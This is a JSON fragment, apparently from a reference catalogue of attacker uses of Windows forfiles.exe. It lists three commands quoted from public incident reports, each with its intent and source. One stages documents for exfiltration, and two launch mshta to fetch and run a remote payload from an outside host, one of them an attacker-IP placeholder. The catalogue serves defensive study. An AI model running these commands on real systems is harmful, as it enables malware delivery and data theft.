    "associated_commands": [
      {
        "command": "forfiles /P F:[REDACTED] /m *%%G /s /d +01.05.2015 /c \"cmd /c copy @path C:ProgramData[REDACTED]d@file\"",
        "intent": "The report says the script identifies all PDF and Office documents dated after May 1st and collects them in a folder, supposedly ready to be exfiltrated.",
        "status": "verified",
        "source_name": "Guarnieri Bundestag Left Party Hack (netzpolitik.org) June 2015",
        "source_url": "https://netzpolitik.org/2015/digital-attack-on-german-parliament-investigative-report-on-the-hack-of-the-left-party-infrastructure-in-bundestag/"
      },
      {
        "command": "forfiles.exe /p C:\\Windows /m win.ini /c \"powershell . mshta https://nextomax.b-cdn[.]net/nexto\"",
        "intent": "Mandiant says the LNK file uses forfiles.exe to search C:\\Windows for win.ini and, for each match, start powershell to retrieve a second-stage payload and execute it with mshta.exe.",
        "status": "verified",
        "source_name": "Mandiant PEAKLIGHT August 2024",
        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/peaklight-decoding-stealthy-memory-only-malware"
      },
      {
        "command": "C:\\Windows\\System32\\forfiles.exe /p c:\\windows\\system32 /m notepad.exe /c \"cmd /c start mshta http ://[attacker-ip]/web\"",
        "intent": "Malwarebytes says the attacker used forfiles.exe to launch mshta so one trusted program starts another and the execution path is harder for security tools to spot.",
        "status": "verified",
        "source_name": "Malwarebytes LOLBins Remcos NetSupport January 2026",
        "source_url": "https://www.malwarebytes.com/blog/news/2026/01/can-you-use-too-many-lolbins-to-drop-some-rats"
      }
    ]
  },
